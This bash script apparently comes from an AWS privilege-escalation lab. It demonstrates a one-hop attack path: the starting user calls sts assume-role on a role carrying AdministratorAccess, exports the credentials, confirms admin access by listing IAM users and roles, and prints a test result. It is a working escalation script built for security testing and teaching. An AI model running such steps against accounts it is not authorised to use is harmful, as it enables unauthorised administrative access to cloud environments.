#!/bin/bash

# Demo script for sts:AssumeRole to admin access
# This script demonstrates how a user can directly assume a role with admin permissions

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
PROFILE="pl-pathfinder-starting-user-prod"
STARTING_USER="pl-pathfinder-starting-user-prod"
ADMIN_ROLE="pl-prod-one-hop-assumerole-admin-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}STS AssumeRole to Admin Access Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Verify starting user identity
echo -e "${YELLOW}Step 1: Verifying identity as starting user${NC}"
CURRENT_USER=$(aws sts get-caller-identity --profile $PROFILE --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    echo "Please configure your AWS CLI profile '$PROFILE' to use the starting user credentials"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 2: Get account ID
echo -e "${YELLOW}Step 2: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --profile $PROFILE --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 3: Check current permissions (should be limited)
echo -e "${YELLOW}Step 3: Testing current permissions (should be limited)${NC}"
echo "Attempting to list IAM users..."
if aws iam list-users --profile $PROFILE --max-items 1 2>&1 | grep -q "AccessDenied\|is not authorized"; then
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (no admin access yet)${NC}"
else
    echo -e "${YELLOW}Warning: May already have elevated permissions${NC}"
fi
echo ""

# Step 4: Assume the admin role
echo -e "${YELLOW}Step 4: Assuming admin role $ADMIN_ROLE${NC}"
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
echo "Role ARN: $ROLE_ARN"
echo "This is the privilege escalation vector..."

CREDENTIALS=$(aws sts assume-role \
    --role-arn $ROLE_ARN \
    --role-session-name demo-admin-session \
    --profile $PROFILE \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')

# Verify we're now the admin role
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ROLE_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed admin role${NC}\n"

# Step 5: Verify admin access
echo -e "${YELLOW}Step 5: Verifying administrator access${NC}"
echo "Testing admin permissions by listing IAM users..."
IAM_USERS=$(aws iam list-users --query 'Users[*].UserName' --output text | head -5)
echo "Successfully listed IAM users: $IAM_USERS"
echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"

# Step 6: Additional admin verification
echo -e "${YELLOW}Step 6: Additional admin verification${NC}"
echo "Listing IAM roles (admin permission required)..."
IAM_ROLES=$(aws iam list-roles --query 'Roles[*].RoleName' --output text | head -5)
echo "Successfully listed IAM roles: $IAM_ROLES"
echo -e "${GREEN}✓ Full administrative privileges confirmed${NC}\n"

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: Directly assumed role ${YELLOW}$ADMIN_ROLE${NC}"
echo -e "Step 2: Gained ${RED}Full Administrator Access${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (AssumeRole) → $ADMIN_ROLE → Administrator"
echo ""
echo -e "${GREEN}The role has AdministratorAccess policy attached, granting full AWS permissions${NC}"
echo ""

# Standardized test results output
echo "TEST_RESULT:prod_one_hop_to_admin_sts_assumerole:SUCCESS"
echo "TEST_DETAILS:prod_one_hop_to_admin_sts_assumerole:Successfully gained admin access via direct role assumption"
echo "TEST_METRICS:prod_one_hop_to_admin_sts_assumerole:role_assumed=true,admin_access_gained=true"
echo ""

# Note about cleanup
echo -e "${YELLOW}Note:${NC} This attack only involves role assumption - no artifacts to clean up"
echo "The assumed role session will expire automatically"
echo ""